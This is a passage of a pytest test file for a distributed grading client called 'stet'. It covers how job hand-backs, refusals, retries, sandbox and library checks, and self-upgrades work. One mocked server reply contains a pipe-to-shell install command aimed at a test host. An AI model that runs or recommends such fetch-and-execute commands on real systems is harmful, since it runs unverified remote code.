    no_sandbox = True  # with STET_DEV=1: these tests run no curator, and need no bubblewrap


@pytest.fixture
def anchor(loop, monkeypatch):
    """The organisers' machine: the server says so, not a flag."""
    monkeypatch.setenv("STET_DEV", "1")
    loop.me = {"account": {"handle": "tester", "anchor": True}, "verifier": {}}
    return loop


def test_the_organisers_machine_stops_with_the_job_in_hand_when_it_cannot_vouch_for_a_round(anchor, capsys):
    # Handing the job back would spend one of the few attempts an entry gets, and going on
    # to take and hand back the round's other jobs would void every entry in it.
    anchor.claims = [a_job(id=1), a_job(id=2)]
    anchor.grade = client.RoundRefused("round s1-o00001: the seed does not follow from the beacon and the crawl")
    with pytest.raises(SystemExit) as e:
        client.cmd_verify(AnchorArgs())
    assert e.value.code == 1 and anchor.graded == [1] and not anchor.released and len(anchor.claims) == 1
    err = capsys.readouterr().err
    assert "does not follow" in err and "Stopping with the job still held" in err

    # A volunteer hands it back and takes no more of that round this session, whether or
    # not it runs curators.
    anchor.me = {"account": {"handle": "tester"}, "verifier": {"established": True}}
    anchor.claims, anchor.graded[:] = [a_job(id=3), a_job(id=4), a_job(id=5, round={"id": "s1-o00002"})], []
    anchor.grade = [client.RoundRefused("the seed does not follow"), None]
    with pytest.raises(Stop):
        client.cmd_verify(AnchorArgs())
    assert anchor.graded == [3, 5] and [p for p, _ in anchor.released] == ["/api/v1/jobs/3/release", "/api/v1/jobs/4/release"]


def test_the_organisers_machine_does_not_walk_away_from_a_round_over_refused_results(anchor):
    # Two results the server will not have is a reason for a volunteer to leave the round
    # alone. An anchor that took and handed back every other job of it would void them all.
    anchor.claims = [a_job(id=n) for n in (1, 2, 3)]
    anchor.report = client.ApiError(400, "the exam score is out of range")
    with pytest.raises(Stop):
        client.cmd_verify(AnchorArgs())
    assert anchor.graded == [1, 2, 3]


def test_a_result_that_could_not_be_delivered_is_not_a_refusal(anchor, capsys):
    # The server's file store is failing: every report answers 500 until report() gives up.
    # Nobody refused anything, so the round's copy is not dropped and no refusal is counted.
    for err in (client.ApiError(0, "gave up reporting after many attempts"), client.ApiError(500, "could not store the script"), client.ApiError(426, "upgrade")):
        anchor.claims, anchor.report = [a_job(id=1), a_job(id=2)], err
        anchor.graded[:], anchor.released[:] = [], []
        anchor.me = {"account": {"handle": "tester", "anchor": True}, "verifier": {}}
        # The organisers' machine stops with the job still its own: started again it is
        # given the same job, and the entry has lost none of its attempts.
        with pytest.raises(SystemExit) as e:
            client.cmd_verify(AnchorArgs())
        assert e.value.code == 1 and anchor.graded == [1] and not anchor.released and not anchor.forgot
        assert "could not be delivered" in capsys.readouterr().err
        # A volunteer hands the job back, says why, and carries on.
        anchor.me = {"account": {"handle": "tester"}, "verifier": {"established": True}}
        anchor.claims, anchor.graded[:] = [a_job(id=3), a_job(id=4)], []
        with pytest.raises(Stop):
            client.cmd_verify(AnchorArgs())
        assert anchor.graded == [3, 4] and anchor.released == [(f"/api/v1/jobs/{n}/release", "the result could not be delivered") for n in (3, 4)]
        assert "could not be delivered" in capsys.readouterr().err and not anchor.forgot


def test_a_no_that_is_not_about_the_round_is_handed_back_and_counts_against_no_round(anchor, capsys):
    # 413, 403, 404: the server will never take this result. An anchor that stopped with the
    # job held would be given it again and do it again, for ever, and the round would never
    # settle. Handed back, the entry runs out of attempts and the round moves on. It is no
    # disagreement about the round either: the copy on disk is kept and nothing is counted.
    for status in (403, 404, 413):
        anchor.claims, anchor.report = [a_job(id=1), a_job(id=2), a_job(id=3)], client.ApiError(status, "no")
        anchor.graded[:], anchor.released[:] = [], []
        with pytest.raises(Stop):
            client.cmd_verify(AnchorArgs())
        assert anchor.graded == [1, 2, 3] and [r for _, r in anchor.released] == ["result refused"] * 3 and not anchor.forgot
        assert "did not accept the result" in capsys.readouterr().err
        anchor.claims, anchor.graded[:], anchor.released[:] = [a_job(id=4), a_job(id=5), a_job(id=6)], [], []
        with pytest.raises(Stop):
            client.cmd_verify(Args())
        assert anchor.graded == [4, 5, 6] and len(anchor.released) == 3 and not anchor.forgot


def test_a_refusal_heard_on_the_second_try_is_still_a_refusal(loop):
    # "Already refused" is what a retry hears when the first answer was lost. It is the
    # refusal, not a result that came too late: the round's copy is dropped and rebuilt once.
    loop.claims = [a_job(id=n) for n in (1, 2, 3)]
    loop.report = client.ApiError(409, "this job was already refused")
    with pytest.raises(Stop):
        client.cmd_verify(Args())
    assert loop.graded == [1, 2] and loop.forgot == ["s1-o00001"]
    for late in ("this job was already released", "this entry already has that grade", "this job ended before your result arrived: its time ran out"):
        loop.claims, loop.report = [a_job(id=n, round={"id": "s1-o00005"}) for n in (4, 5, 6)], client.ApiError(409, late)
        loop.graded[:] = []
        with pytest.raises(Stop):
            client.cmd_verify(Args())
        assert loop.graded == [4, 5, 6] and loop.forgot == ["s1-o00001"]


def test_a_hand_back_the_server_never_heard_is_not_called_one(loop, monkeypatch, capsys):
    served = client.request
    lost = []

    def request(method, path, body=None, **kw):
        if path.endswith("/release"):
            lost.append(path)
            raise client.ApiError(503, "could not make the write durable")
        return served(method, path, body, **kw)

    monkeypatch.setattr(client, "request", request)
    job = a_job(id=5, expires_at=4_102_444_800)  # 2100-01-01 00:00 UTC
    loop.claims, loop.grade, loop.interrupt_at = [job], RuntimeError("CUDA error: device lost"), 60  # Ctrl-C between two tries
    client.cmd_verify(Args())
    err = capsys.readouterr().err
    # Asked three times, a few seconds apart, and then the truth: it is still held.
    assert lost == ["/api/v1/jobs/5/release"] * 3 and loop.slept == [60, 2, 5]
    assert "handed back" not in err and "still held until 00:00 UTC" in err and "costs this account a day" in err and "Run `stet verify` again" in err

    # The second try getting through is a hand-back like any other.
    answers = [client.ApiError(0, "cannot reach"), {}]

    def flaky(method, path, body=None, **kw):
        a = answers.pop(0)
        if isinstance(a, Exception):
            raise a
        return a

    monkeypatch.setattr(client, "request", flaky)
    assert client._release(5, None, "interrupted") is True and not answers
    # And a server that says the job is not ours to hand back has nothing of ours.
    monkeypatch.setattr(client, "request", lambda *a, **k: (_ for _ in ()).throw(client.ApiError(404, "no such job for this account")))
    assert client._release(5, None, "interrupted") is True


def test_a_volunteer_hands_its_job_back_on_every_way_out(loop, monkeypatch, capsys):
    from stet.data import FetchError

    # Kept through a failed download, and then the server says this client is out of date.
    answers = [{"job": a_job(id=8)}, client.ApiError(426, "this server speaks harness 0.9; upgrade")]

    def request(method, path, body=None, **kw):
        if path == "/api/v1/season":
            return {"scale": "nano"}
        if path == "/api/v1/me":
            return loop.me
        if path.endswith("/release"):
            loop.released.append((path, body["reason"]))
            return {}
        a = answers.pop(0)
        if isinstance(a, Exception):
            raise a
        return a

    monkeypatch.setattr(client, "request", request)
    loop.grade = FetchError("timed out")
    with pytest.raises(SystemExit):
        client.cmd_verify(Args())
    assert loop.released == [("/api/v1/jobs/8/release", "the verifier stopped")] and "The job in hand was handed back." in capsys.readouterr().err

    # Something nobody expected, in the middle of a job.
    answers[:] = [{"job": a_job(id=9)}]
    monkeypatch.setattr(client, "slim_result", lambda result, base: 1 / 0)
    loop.grade, loop.released[:] = None, []
    monkeypatch.setattr(client, "STOP_AFTER_FAILURES", 1)
    with pytest.raises(SystemExit):
        client.cmd_verify(Args())
    assert [p for p, _ in loop.released] == ["/api/v1/jobs/9/release"]  # handed back where it failed, and not twice

    # A job the server took for ours before this client could make sense of it.
    answers[:] = [{"job": a_job(id=10, kind="shell")}]
    loop.released[:] = []
    with pytest.raises(IndexError):  # the test's server has no more to say
        client.cmd_verify(Args())
    assert loop.released == [("/api/v1/jobs/10/release", "this client does not understand the job")]

    # The one way out that hands nothing back: a work directory that cannot be cleared.
    from stet import runner

    answers[:] = [{"job": a_job(id=11)}]
    loop.released[:] = []
    monkeypatch.setattr(runner, "remove_tree", lambda path: False)
    with pytest.raises(SystemExit):
        client.cmd_verify(Args())
    assert not loop.released and "could not clear" in capsys.readouterr().err


def test_the_organisers_machine_stopped_any_other_way_keeps_its_job(anchor, monkeypatch):
    from stet.data import FetchError

    answers = [{"job": a_job(id=8)}, client.ApiError(426, "upgrade")]

    def request(method, path, body=None, **kw):
        if path == "/api/v1/season":
            return {"scale": "nano"}
        if path == "/api/v1/me":
            return anchor.me
        if path.endswith("/release"):
            anchor.released.append(path)
            return {}
        a = answers.pop(0)
        if isinstance(a, Exception):
            raise a
        return a

    monkeypatch.setattr(client, "request", request)
    anchor.grade = FetchError("timed out")
    with pytest.raises(SystemExit):
        client.cmd_verify(AnchorArgs())
    assert not anchor.released  # started again, it is given the same job; handing it back would spend an attempt


def test_an_announcement_that_cannot_be_written_down_stops_nothing(loop, monkeypatch, capsys):
    def full(season, announced, now=None):
        raise OSError(28, "No space left on device")

    monkeypatch.setattr(client, "remember_announcement", full)
    loop.claims, loop.report = [a_job(id=1), a_job(id=2)], {"status": "pending"}
    args = Args()
    args.max_jobs = 2
    client.cmd_verify(args)
    err = capsys.readouterr().err
    assert loop.graded == [1, 2] and not loop.released
    assert err.count("could not write down what the server announced") == 1 and "No space left on device" in err


def test_submit_says_which_round_only_when_the_server_expects_it_there(monkeypatch, tmp_path, capsys):
    from test_project import make

    p = make(tmp_path, {})
    key = client.create_key()
    key.handle = "tester"
    key.save()
    args = SubmitArgs(p.path)
    args.dry_run, args.yes = False, True
    editor = {"name": "a-curator", "version": 1, "id": "ab" * 32}
    for reply, said, unsaid in (
        ({"enters": {"round": "s1-o00002", "draw_at": 0}}, "It enters round s1-o00002.", "earliest"),
        ({"earliest": {"round": "s1-o00002", "draw_at": 0}, "message": "The queue is longer than one round can take."}, "The earliest round it can enter is s1-o00002.", "It enters"),
        ({}, "Submitted a-curator v1", "round"),
    ):
        monkeypatch.setattr(client, "request", lambda *a, reply=reply, **k: {"editor": editor, "url": "http://x/editors/abab", **reply})
        client.cmd_submit(args)
        err = capsys.readouterr().err.split("Submitted", 1)[1]
        assert said.replace("Submitted", "").strip() in err and unsaid not in err


def test_a_machine_without_the_seasons_libraries_takes_no_edit_jobs(loop, monkeypatch, capsys):
    from stet import env, runner

    for check in ("bwrap_available", "scope_available", "sandbox_selftest"):
        monkeypatch.setattr(runner, check, lambda: (True, ""))
    monkeypatch.setattr(env, "problems", lambda season, only=None: [] if only else ["a different version: transformers 5.0.0 (the season's is 5.23.0)"])
    args = Args()
    args.edits = True
    with pytest.raises(SystemExit):
        client.cmd_verify(args)
    err = capsys.readouterr().err
    assert "promised the season's Python and libraries" in err and "transformers 5.0.0" in err and "install.sh" in err


def test_a_machine_slower_than_the_floor_takes_no_edit_jobs_and_is_told_it_can_grade(loop, monkeypatch, capsys):
    from stet import bench, runner

    for check in ("bwrap_available", "scope_available", "sandbox_selftest"):
        monkeypatch.setattr(runner, check, lambda: (True, ""))
    monkeypatch.setattr(bench, "saved", lambda *a, **k: {**FAST_MACHINE, "gpu_tokens_per_second": 10, "gpu_memory_gb": 6})
    args = Args()
    args.edits = True
    with pytest.raises(SystemExit):
        client.cmd_verify(args)
    err = capsys.readouterr().err
    assert "cannot run curators for the leaderboard" in err and "slower than the floor" in err and "It can still grade" in err


def test_a_grader_with_another_pytorch_is_turned_away_before_it_grades(loop, monkeypatch, capsys):
    from stet import env

    monkeypatch.setattr(env, "problems", lambda season, only=None: ["a different version: torch 2.9.0 (the season's is 2.15.0)"] if only == ("torch",) else [])
    from stet.spec import load_season

    monkeypatch.setattr(Args, "any_device", False, raising=False)
    monkeypatch.setitem(load_season("s1").raw, "grade_devices", ["cuda", "cpu"])  # the test machine's device counts, so the check is reached
    loop.claims = [a_job()]
    with pytest.raises(SystemExit):
        client.cmd_verify(Args())
    assert "the season's PyTorch" in capsys.readouterr().err and not loop.graded


def test_an_account_is_told_where_it_stands():
    # Scores are made from established accounts' work. An account that is not there yet
    # is told what is missing, in numbers.
    said = client.standing_line({}, {"validated": 2, "establish_after": 5, "needs_github": True})
    assert "not yet established" in said and "3 more grades that agree" in said and "stet login --github" in said
    assert client.standing_line({}, {"validated": 9, "established": True, "runs": 4}) == "established: its runs and grades count towards scores; 4 curators run"
    assert "Still to come" not in client.standing_line({}, {})  # an older server says nothing about it
    assert "more grades" not in client.standing_line({}, {"validated": True, "establish_after": "5"})  # and nonsense is not arithmetic


def test_a_volunteer_who_asks_to_run_editors_before_it_is_established_is_told_why_it_gets_none(loop, monkeypatch, capsys):
    from stet import runner

    monkeypatch.setenv("STET_DEV", "1")
    for check in ("bwrap_available", "scope_available", "sandbox_selftest"):
        monkeypatch.setattr(runner, check, lambda: (True, ""))
    # The server says, with each answer, whether this machine is handed curators, and why not.
    why = "curators are run by established verifiers: accounts with 5 grades that agreed. This one has 2"
    loop.claims = [a_job(), a_job(id=8), a_job(id=9), a_job(id=10)]
    loop.runner = [{"eligible": False, "reason": why}, {"eligible": False, "reason": why + "\x1b[2J"}, {"eligible": True, "reason": ""}, {"eligible": True}]
    args = Args()
    args.edits = True
    with pytest.raises(Stop):
        client.cmd_verify(args)
    err = capsys.readouterr().err
    # Said once while it stays the same, in the server's words made safe to print, and unsaid when it changes.
    assert err.count("Not given curators to run: curators are run by established verifiers") == 2 and "\x1b" not in err
    assert err.count("This one has 2. Given grading meanwhile.") == 1 and err.count("now given curators to run") == 1 and loop.graded == [7, 8, 9, 10]
    # A machine that may run them from the start is told nothing of the kind.
    loop.claims, loop.runner = [a_job()], [{"eligible": True, "reason": ""}]
    with pytest.raises(Stop):
        client.cmd_verify(args)
    err = capsys.readouterr().err
    assert "Not given curators" not in err and "now given" not in err


def test_a_volunteer_who_runs_editors_hands_back_what_it_cannot_finish(loop, monkeypatch):
    # Only the organisers' machine keeps a job through a stop. A volunteer who runs curators
    # is still a volunteer: its job goes back, so that someone else can take it.
    from stet import runner

    monkeypatch.setenv("STET_DEV", "1")
    for check in ("bwrap_available", "scope_available", "sandbox_selftest"):
        monkeypatch.setattr(runner, check, lambda: (True, ""))
    loop.me = {"account": {"handle": "tester"}, "verifier": {"established": True}}
    monkeypatch.setattr(client, "_edit_job", lambda *a, **k: loop.interrupt())
    loop.claims = [a_job(kind="edit", script=None)]
    args = Args()
    args.edits = True
    client.cmd_verify(args)
    assert loop.released == [("/api/v1/jobs/7/release", "interrupted")]


# --- a verifier left running keeps itself current -------------------------------------------------


@pytest.fixture
def upgrades(monkeypatch):
    """An install the installer made, where an upgrade works and a restart is the end of the process."""
    import types

    from stet import upgrade

    class Restarted(Exception):
        pass

    seen = types.SimpleNamespace(installs=[], Restarted=Restarted)

    def restart(path):
        raise Restarted(path)

    monkeypatch.delenv("STET_DEV", raising=False)
    monkeypatch.delenv("STET_AUTO_UPGRADE", raising=False)
    monkeypatch.setattr(upgrade, "can", lambda: (True, ""))
    monkeypatch.setattr(upgrade, "launcher", lambda: "/home/u/.local/bin/stet")
    monkeypatch.setattr(upgrade, "install", lambda site, env=None, log=None: (seen.installs.append(site), (True, ""))[1])
    monkeypatch.setattr(upgrade, "installed_version", lambda path: "99.0.0")
    monkeypatch.setattr(upgrade, "restart", restart)
    return seen


def test_a_verifier_started_on_an_old_version_upgrades_before_it_asks_for_work(loop, upgrades, monkeypatch):
    asked = []

    def request(method, path, body=None, **kw):
        asked.append(path)
        if path == "/api/v1/season":
            return {"scale": "nano", "site": "https://site.test", "cli": {"version": "99.0.0"}}
        if path == "/api/v1/me":
            return loop.me
        raise AssertionError(f"unexpected request: {method} {path}")

    monkeypatch.setattr(client, "request", request)
    with pytest.raises(upgrades.Restarted):
        client.cmd_verify(Args())
    assert upgrades.installs == ["https://site.test"] and "/api/v1/jobs/claim" not in asked


def test_a_verifier_the_server_calls_out_of_date_upgrades_itself_when_it_holds_no_job(loop, upgrades, monkeypatch, capsys):
    season = [{"scale": "nano"}, {"scale": "nano", "site": "https://site.test", "cli": {"version": "99.0.0"}}]

    def request(method, path, body=None, **kw):
        if path == "/api/v1/season":
            return season.pop(0)  # current when it started; a release came out while it ran
        if path == "/api/v1/me":
            return loop.me
        if path == "/api/v1/jobs/claim":
            raise client.ApiError(426, "this verifier is out of date")
        raise AssertionError(f"unexpected request: {method} {path}")

    monkeypatch.setattr(client, "request", request)
    with pytest.raises(upgrades.Restarted):
        client.cmd_verify(Args())
    assert upgrades.installs == ["https://site.test"] and not loop.released


def test_with_upgrades_turned_off_an_out_of_date_verifier_stops_and_says_what_to_run(loop, upgrades, monkeypatch, capsys):
    def request(method, path, body=None, **kw):
        if path == "/api/v1/season":
            return {"scale": "nano", "site": "https://site.test", "cli": {"version": "99.0.0"}}
        if path == "/api/v1/me":
            return loop.me
        if path == "/api/v1/jobs/claim":
            raise client.ApiError(426, "this verifier is out of date. Upgrade: curl -fsSL https://site.test/install.sh | sh")
        raise AssertionError(f"unexpected request: {method} {path}")

    class Off(Args):
        no_upgrade = True

    monkeypatch.setattr(client, "request", request)
    with pytest.raises(SystemExit) as e:
        client.cmd_verify(Off())
    said = capsys.readouterr()
    assert e.value.code == 1 and upgrades.installs == []
    assert "Automatic upgrades are off" in said.out + said.err and "install.sh" in said.err


def test_an_upgrade_that_cannot_get_through_is_tried_again_rather_than_stopping_an_unattended_verifier(loop, upgrades, monkeypatch, capsys):
    from stet import upgrade

    monkeypatch.setattr(upgrade, "install", lambda site, env=None, log=None: (upgrades.installs.append(site), (False, "no route to host"))[1])
    season = [{"scale": "nano"}]

    def request(method, path, body=None, **kw):
        if path == "/api/v1/season":
            return season.pop(0) if season else {"scale": "nano", "site": "https://site.test", "cli": {"version": "99.0.0"}}
        if path == "/api/v1/me":
            return loop.me
        if path == "/api/v1/jobs/claim":
            raise client.ApiError(426, "this verifier is out of date")
        raise AssertionError(f"unexpected request: {method} {path}")

    loop.interrupt_at = 600  # the wait before the next try: stop the test there
    monkeypatch.setattr(client, "request", request)
    with pytest.raises((KeyboardInterrupt, SystemExit)):
        client.cmd_verify(Args())
    assert upgrades.installs == ["https://site.test"] and 600 in loop.slept
    said = capsys.readouterr().err
    assert "did not work" in said and "trying again in 10 minutes" in said


# --- a machine the organisers rent --------------------------------------------------------


def test_a_verifier_told_to_stop_when_idle_stops_only_with_no_job_in_hand(loop, capsys):
    args = Args()
    args.exit_when_idle = 2
    # Idle for a minute, then a job, which starts the count again; then two minutes with
    # nothing, and it stops at the next answer that has no job for it.
    loop.claims = [None, a_job(id=1), None, None, None, a_job(id=2)]
    client.cmd_verify(args)
    assert loop.graded == [1] and loop.claims == [a_job(id=2)] and not loop.released
    assert loop.slept == [60, 60, 60]
    assert "Stopping, as asked" in capsys.readouterr().err


def test_a_rented_machine_hands_its_job_back(loop, monkeypatch):
    from stet.data import FetchError

    loop.me = {"account": {"handle": "rented-one", "anchor": True, "worker": True}, "verifier": {}}
    loop.claims = [a_job(id=1)]
    with pytest.raises(Stop):
        client.cmd_verify(Args())
    assert loop.graded == [1]

    # Stopped in the middle of a job (here the server goes away while a download is being
    # waited out), it hands the job back: nobody starts it again to pick the job up.
    loop.claims, loop.grade = [a_job(id=8)], FetchError("timed out")
    with pytest.raises(Stop):
        client.cmd_verify(Args())
    assert loop.released == [("/api/v1/jobs/8/release", "the verifier stopped")]
